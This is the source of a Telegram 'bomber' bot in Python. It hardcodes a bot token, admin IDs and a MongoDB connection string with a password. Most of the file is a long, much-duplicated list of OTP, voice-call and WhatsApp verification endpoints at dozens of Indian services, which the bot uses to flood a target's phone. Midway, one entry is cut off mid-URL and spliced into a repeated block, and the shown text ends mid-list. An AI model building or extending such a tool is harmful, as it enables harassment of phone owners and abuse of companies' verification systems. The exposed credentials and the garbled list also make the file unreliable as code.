import telebot
import os
import random
import string
import threading
import asyncio
import aiohttp
import time
from datetime import datetime
from pymongo import MongoClient

# ================= BOT CONFIGURATION =================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8825754114:AAG_4d08ZCDtPJyl2shz4UED5eBg8iHJcrQ")
ADMIN_IDS = [int(x) for x in os.environ.get("ADMIN_IDS", "8490612097,8864524240").split(",")] # yaha multiple admin IDs rahega agr mann hai to daalo nhi to nhi
PROTECTED_NUMBERS = os.environ.get("PROTECTED_NUMBERS", "8851353953,8527392074").split(",") # Protect your number 😁--

bot = telebot.TeleBot(BOT_TOKEN)
bombing_status = {}

# ================= MONGODB SETUP =================
MONGO_URL = os.environ.get("MONGO_URL", "mongodb+srv://Dark:z37qVCTrfqUPWUXP@cluster0.6lgvl4z.mongodb.net/?appName=Cluster0")
client = MongoClient(MONGO_URL)
db = client["detor_bomber_bot"]

users_col = db["users"]
codes_col = db["codes"]
settings_col = db["settings"]
banned_col = db["banned"]

# Default Config
if not settings_col.find_one({"_id": "config"}):
    settings_col.insert_one({"_id": "config", "daily_bonus": True})

# ============ API LIST (Sample) ============
APIS = [
    # === Existing APIs (keep all original) ===
    {"name": "Tata Capital", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "1MG", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Swiggy", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Myntra", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Flipkart", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Amazon", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Paytm", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Zomato", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "MakeMyTrip", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Goibibo", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Ola", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Uber", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f"}},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Byjus", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Tata Capital Voice Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "1MG Voice Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}},
    {"name": "Swiggy Call Verification", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}},
    {"name": "Myntra Voice Call", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Flipkart Voice Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Amazon Voice Call", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Paytm Voice Call", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Zomato Voice Call", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "MakeMyTrip Voice Call", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Goibibo Voice Call", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Ola Voice Call", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Uber Voice Call", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "KPN WhatsApp (extended)", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"}},
    {"name": "Foxy WhatsApp (extended)", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Jockey WhatsApp", "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}},
    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Wakefit SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Byju's SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Hungama OTP", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Lending Plate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Univest", "url": "https://api.univest.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}},
    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}},
    {"name": "ServeTel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"}},
    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}},
    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "MyImagineStore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}},
    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "MyHubble Money", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Tata Capital Business", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "PenPencil V3", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "BigCash", "url": "https://www.bigcash.live/sendsms.php", "method": "POST", "headers": {"Referer": "https://www.bigcash.live/games/poker", "Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Lifestyle Stores", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "WorkIndia", "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Vyapar", "url": "https://vyaparapp.in/api/ftu/v3/send/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "MyGov", "url": "https://auth.mygov.in/regapi/register_api_ver1/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "CodFirm", "url": "https://api.codfirm.in/api/customers/login/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "AstroSage", "url": "https://vartaapi.astrosage.com/sdk/registerAS", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "TooToo", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "ConfirmTkt", "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Nuvama Wealth", "url": "https://nma.nuvamaweal    {"name": "Uber Voice Call", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "KPN WhatsApp (extended)", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"}},
    {"name": "Foxy WhatsApp (extended)", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Jockey WhatsApp", "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}},
    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Wakefit SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Byju's SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Hungama OTP", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Lending Plate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Univest", "url": "https://api.univest.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}},
    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}},
    {"name": "ServeTel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"}},
    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}},
    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "MyImagineStore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}},
    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "MyHubble Money", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Tata Capital Business", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "PenPencil V3", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "BigCash", "url": "https://www.bigcash.live/sendsms.php", "method": "POST", "headers": {"Referer": "https://www.bigcash.live/games/poker", "Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Lifestyle Stores", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "WorkIndia", "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Vyapar", "url": "https://vyaparapp.in/api/ftu/v3/send/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "MyGov", "url": "https://auth.mygov.in/regapi/register_api_ver1/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "CodFirm", "url": "https://api.codfirm.in/api/customers/login/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "AstroSage", "url": "https://vartaapi.astrosage.com/sdk/registerAS", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "TooToo", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}},
    {"name": "ConfirmTkt", "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput", "method": "POST", "headers": {"Content-Type": "application/json"}},
